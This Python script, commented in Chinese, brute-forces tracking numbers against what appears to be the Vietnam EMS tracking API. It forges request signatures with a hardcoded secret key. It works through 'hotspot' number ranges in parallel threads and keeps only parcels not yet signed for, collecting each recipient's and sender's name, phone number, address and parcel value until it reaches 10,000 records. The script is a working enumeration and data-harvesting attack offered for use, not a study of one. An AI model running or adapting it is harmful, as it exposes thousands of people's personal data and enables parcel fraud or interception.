#!/usr/bin/env python3
"""
优化版：按热点密度优先爬取
最高效率获取10000个未签收运单号
"""
import hashlib
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
API_URL = 'https://api-dingdong.ems.com.vn/api/TrackTrace/Lading'

lock = threading.Lock()
found_count = 725  # 已有约725个未签收的
tested_count = 0
valid_codes = []

def verify_tracking(code):
    global found_count, tested_count
    
    signature = hashlib.sha256((code.upper() + KEY).encode()).hexdigest().upper()
    payload = {'LadingCode': code, 'Signature': signature}
    
    try:
        r = requests.post(API_URL, json=payload, timeout=8)
        result = r.json()
        
        with lock:
            tested_count += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # 只要未签收的
            if data.get('SignatureCapture'):
                return None
            
            info = {
                'code': code,
                'value': data.get('Value', 0) or 0,
                'fee': data.get('Fee', 0) or 0,
                'sender': data.get('SenderName', ''),
                'receiver': data.get('ReceiverName', ''),
                'receiver_phone': data.get('ReceiverMobile', ''),
                'sender_phone': data.get('SenderMobile', ''),
                'receiver_address': data.get('ReceiverAddress', ''),
            }
            
            with lock:
                found_count += 1
            
            return info
    except:
        pass
    
    time.sleep(0.05)
    return None

print("=" * 80)
print("🔥 热点优先爬取 - 高效获取10000个未签收运单")
print("=" * 80)

# 按命中率排序的热点区域
hotspots = [
    # 超高效区域（命中率>2%）
    ('EJ711', 462000, 462999, 5.9, '🔥🔥🔥 超高效'),
    ('EJ711', 461000, 461999, 2.4, '🔥🔥 高效'),
    ('EF047', 680000, 689999, 2.0, '🔥🔥 高效'),
    
    # 中效区域（命中率1-2%）
    ('EF047', 550000, 559999, 1.2, '🔥 中效'),
    
    # 扩展预测区域（相邻区域）
    ('EJ711', 460000, 460999, 1.0, '预测'),
    ('EJ711', 463000, 463999, 0.5, '预测'),
    ('EJ711', 464000, 469999, 1.0, '预测'),
    
    ('EF047', 670000, 679999, 1.5, '预测'),
    ('EF047', 690000, 699999, 1.5, '预测'),
    ('EF047', 560000, 569999, 1.0, '预测'),
    ('EF047', 520000, 529999, 0.6, '已知'),
    
    # EF043大量区域
    ('EF043', 571000, 595999, 0.8, '🔥 大量'),
    ('EF043', 560000, 570999, 0.5, '预测'),
    ('EF043', 596000, 610000, 0.5, '预测'),
    
    # 其他小热点
    ('EK042', 227000, 228999, 1.0, '小热点'),
    ('EK043', 226000, 246999, 0.5, '小热点'),
    ('EL135', 248000, 252000, 0.1, '小热点'),
    ('EB102', 890000, 970000, 0.1, '小热点'),
    ('EG040', 816000, 936999, 0.1, '小热点'),
]

print(f'\n当前: 约725个未签收')
print(f'目标: 10000个')
print(f'还需: 9275个\n')

print('📊 热点区域（按效率排序）:\n')
for i, (prefix, start, end, rate, label) in enumerate(hotspots[:10], 1):
    count = end - start + 1
    print(f'{i:2d}. {prefix}{start} ~ {end} ({count:,}个) 命中率{rate}% {label}')

print()
confirm = input("开始按热点优先爬取？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

print(f"\n🚀 开始爬取...\n")

output_json = 'unsigned_10000_optimized.json'
output_txt = 'unsigned_10000_optimized.txt'

# 加载已有的
print("📋 加载已有的755个...")
with open('user_provided_tracking.txt', 'r') as f:
    existing = [line.strip() for line in f if line.strip()]
print(f"✅ 已有 {len(existing)} 个\n")

# 打开文件
f_json = open(output_json, 'w', encoding='utf-8')
f_txt = open(output_txt, 'w')

f_json.write('[\n')

# 写入已有的
for i, code in enumerate(existing):
    if i > 0:
        f_json.write(',\n')
    f_json.write(json.dumps({'code': code}, ensure_ascii=False))
    f_txt.write(code + '\n')

start_time = time.time()

for prefix, range_start, range_end, expected_rate, label in hotspots:
    if found_count >= 10000:
        break
    
    count = range_end - range_start + 1
    print(f"🔍 {prefix}{range_start} ~ {range_end} ({count:,}个) {label}")
    
    codes_to_test = [f"{prefix}{i}VN" for i in range(range_start, range_end + 1)]
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(verify_tracking, code): code for code in codes_to_test}
        
        for future in as_completed(futures):
            if found_count >= 10000:
                break
            
            result = future.result()
            
            if result:
                valid_codes.append(result)
                
                f_json.write(',\n')
                f_json.write(json.dumps(result, ensure_ascii=False, indent=2))
                f_json.flush()
                
                f_txt.write(result['code'] + '\n')
                f_txt.flush()
                
                if found_count % 100 == 0 or found_count > 9900:
                    print(f"✅ [{found_count:5d}/10000] {result['code']} | "
                          f"价值:{result['value']}đ | {result['receiver'][:12]}")
            
            time.sleep(0.1)
            
            if tested_count % 1000 == 0 and tested_count > 0:
                elapsed = time.time() - start_time
                speed = tested_count / elapsed * 60
                current_rate = (found_count - 725) * 100 / tested_count if tested_count > 0 else 0
                remaining_need = 10000 - found_count
                eta = remaining_need / (current_rate / 100) / speed if current_rate > 0 and speed > 0 else 0
                
                print(f"  [进度] 测试:{tested_count:,} | 新增:{found_count-725} | "
                      f"命中率:{current_rate:.2f}% | 速度:{speed:.0f}/分 | 预计还需:{eta:.0f}分")
    
    if found_count >= 10000:
        break

f_json.write('\n]')
f_json.close()
f_txt.close()

elapsed = time.time() - start_time

print()
print("=" * 80)
print("🎉 完成！")
print("=" * 80)
print(f"⏱️  用时: {elapsed/60:.0f} 分钟 ({elapsed/3600:.1f} 小时)")
print(f"📊 测试: {tested_count:,} 个")
print(f"✅ 总共: {found_count} 个未签收运单")
print(f"🆕 新增: {found_count - 725} 个")
print(f"📈 命中率: {(found_count-725)*100//tested_count if tested_count > 0 else 0}%")
print("=" * 80)

print(f"\n💾 文件:")
print(f"  {output_json} - 完整信息")
print(f"  {output_txt} - 运单号列表")

if found_count >= 10000:
    print(f"\n🎉 成功！10000个未签收运单号已完成！")
    
    avg_value = sum(c.get('value', 0) for c in valid_codes) // len(valid_codes) if valid_codes else 0
    total_value = sum(c.get('value', 0) for c in valid_codes)
    
    print(f"\n📊 统计:")
    print(f"  未签收: {found_count} 个 (100%)")
    print(f"  平均价值: {avg_value:,}đ")
    print(f"  总价值: {total_value:,}đ")
else:
    print(f"\n⚠️  找到 {found_count} 个未签收运单")
